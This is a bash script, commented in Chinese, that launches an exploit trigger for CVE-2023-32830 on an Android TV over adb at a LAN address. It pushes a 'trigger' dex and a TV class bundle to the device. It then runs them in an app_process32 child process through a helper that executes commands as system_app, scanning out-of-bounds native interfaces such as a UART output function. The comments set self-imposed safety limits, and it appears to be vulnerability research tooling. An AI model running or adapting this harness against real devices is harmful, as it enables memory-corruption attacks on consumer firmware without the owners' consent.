#!/bin/bash
# ============================================================
# run_cve.sh — CVE-2023-32830 独立子进程差分触发一键脚本（安全红线内）
#
# 原则：
#   * 只跑【独立 app_process32 子进程】，绝不打 TvService 主进程
#   * 独立子进程崩溃 = SIGSEGV/abort，不影响系统，不可能变砖
#   * 不写持久存储、不写 eMMC env、不做任何 ioctl
#
# 通道：复用已稳定的 sa3.sh（system_app 域 + runSystemCommand 一个窗口执行）
#
# 用法: ./run_cve.sh [0|1] [mode]
#   ./run_cve.sh 0 safe    # Step 0 最小可行性(反射+类加载)，零风险，必须先过
#   ./run_cve.sh 1 all     # Step 2 差分触发：渐变长度扫描全部越界面
#   ./run_cve.sh 1 uart    # 只扫 outputUARTSerial_native
# ============================================================
A=/d/Tools/platform-tools/adb.exe
D=192.168.1.164:5555
CVE="D:/Work/WorkBuddy/.tools/tv/cve_dispatch"
TVROOT="D:/Work/WorkBuddy/.tools/tv"
CP="/sdcard/cve_tv.dex:/sdcard/cve_tr.dex"

START="${1:-0}"
MODE="${2:-safe}"

[ "$START" != "0" ] && [ "$START" != "1" ] && { echo "START 只能 0(safe) 或 1(差分)"; exit 1; }

# app_process32 命令行（双 dex classpath，冒号分隔，规避 multi-dex jar PathClassLoader 限制）
# 位置参数: <目录>/system/bin, 然后 -Djava.class.path=..., 主类, 参数
APPC="app_process32 /system/bin -Djava.class.path=${CP} TvgTrigger ${MODE} 64"

# 设备端执行体
DEVSH="rm -f /sdcard/trig_log.txt /sdcard/trig_debug.txt; echo '=== uid ==='; id; echo '=== run app_process32 ==='; ${APPC} 2>&1 | head -120; echo '=== exit='\$? '==='; echo '=== trig_log tail ==='; [ -f /sdcard/trig_log.txt ] && tail -40 /sdcard/trig_log.txt"

echo "╔══════════════════════════════════════════════════════"
echo "║ CVE 触发调度  START=$START  MODE=$MODE"
echo "║ 设备: $D  通道: system_app(runSystemCommand)"
echo "╚══════════════════════════════════════════════════════"

# ---- push dex + 执行体 ----
"$A" disconnect "$D" >/dev/null 2>&1
for i in $(seq 1 20); do
  "$A" connect "$D" >/dev/null 2>&1
  if "$A" -s "$D" get-state 2>/dev/null | grep -q device; then break; fi
  sleep 2
done
if ! "$A" -s "$D" get-state 2>/dev/null | grep -q device; then
  echo "❌ 设备不在线。请先物理断电/重启电视，再运行。"
  exit 2
fi
echo "✅ 设备在线"

"$A" -s "$D" push "$CVE/tvclasses.dex" /sdcard/cve_tv.dex >/dev/null 2>&1 && echo "push tvclasses(2.8MB) OK"
"$A" -s "$D" push "$CVE/trigger.dex" /sdcard/cve_tr.dex >/dev/null 2>&1 && echo "push trigger OK"

# ---- 经 sa3.sh 执行（含稳定连接+push+exec+pull 全封装）----
cd "$TVROOT" && ./sa3.sh "$DEVSH"